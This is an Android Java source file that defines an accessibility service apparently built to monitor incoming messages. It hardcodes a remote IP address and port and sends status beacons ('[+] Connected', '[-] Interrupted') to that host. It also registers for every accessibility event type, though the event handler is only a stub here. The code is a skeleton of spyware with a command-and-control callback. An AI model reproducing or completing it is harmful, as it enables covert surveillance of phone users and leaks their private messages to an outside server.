package me.paradis.listenincomingmessages;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;

public class MyAccessibilityService extends AccessibilityService {

    static final String TAG = "RecorderService";
    String ip=null;
    String port;

    public void send(String s1){
        System.out.println("called send");

            //String[] l1=get1();
            ip="45.56.113.154";
            port="505";


            MessageSender messageSender = new MessageSender();
            messageSender.execute(s1,ip,port);

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        System.out.println("called on accessibility event");
    }

    @Override
    public void onInterrupt() {
        send("[-] Interrupted !!! ");
    }

    @Override
    protected void onServiceConnected() {
        System.out.println("connected");

        super.onServiceConnected();
        send("[+] Connected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }

}
